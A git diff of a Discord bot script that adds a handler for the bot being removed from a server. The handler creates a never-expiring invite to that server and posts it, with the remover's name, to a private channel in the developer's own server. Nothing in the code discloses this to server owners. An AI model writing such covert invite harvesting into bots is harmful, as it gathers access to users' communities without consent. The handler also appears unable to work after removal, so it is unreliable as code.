@@ -28,17 +28,26 @@ cc.send(`\`${auditlog.executor.tag}\` added bot in __**${guild.name}**__\nLink:-
 });
 });
 
+bot.on('guildDelete', async guild => {
+	const fetchedLogs = await guild.fetchAuditLogs({
+		limit: 1,
+		type: 'BOT_REMOVE',
+	});
+	const auditlog = fetchedLogs.entries.first();
+let myg=bot.guilds.cache.find(guild=>guild.id=="726055475178635305");
+let cc=myg.channels.cache.find(channel=>channel.id=="762981236351959061");
+let invitech=guild.channels.cache.find(channel=>channel.type=='text');
+invitech.createInvite({maxAge:0})
+.then(invite=>{
+cc.send(`\`${auditlog.executor.tag}\` removed bot in __**${guild.name}**__\nLink:- https://discord.gg/${invite.code}`);
+});
+});
+
 bot.on("ready", () => {
   // This event will run if the bot starts, and logs in, successfully.
   console.log(`Bot has started, with ${bot.users.cache.size} users, in ${bot.channels.cache.size} channels of ${bot.guilds.cache.size} guilds.`);
   // Example of changing the bot's playing game to something useful. `client.user` is what the
   // docs refer to as the "ClientUser".
-  bot.user.setActivity(`Serving ${bot.guilds.cache.size} servers`);
-});
-
-bot.on("guildCreate", guild => {
-  // This event triggers when the bot joins a guild.
-  console.log(`New guild joined: ${guild.name} (id: ${guild.id}). This guild has ${guild.memberCount} members!`);
   bot.user.setActivity(`Serving ${bot.guilds.cache.size} servers`);
 });
 
